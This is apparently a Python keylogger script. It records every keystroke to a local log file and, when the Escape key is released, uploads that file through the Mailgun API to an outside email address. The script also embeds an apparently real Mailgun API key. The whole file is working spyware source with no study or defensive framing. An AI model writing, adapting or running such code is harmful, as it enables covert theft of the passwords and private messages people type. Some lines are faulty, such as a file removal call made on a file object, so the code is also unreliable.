from pynput import keyboard
import requests
import os

f = open("log.txt", "a")

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
    f.write('{0}'.format(key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        requests.post(
		"https://api.mailgun.net/v3/sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org/messages",
		auth=("api", "72b534a66aa156cc10e6862e6ff6f200-2bf328a5-b1a54fac"),
		data={"from": "Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>",
			"to": "Jonathan <l0wk3yiaan@protonmail.com>",
			"subject": "Hello Jonathan",
			"text": "Log file."},
        files={"file": open('log.txt','rb')})
        f.close()
        os.remove(f)
        return False
        

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()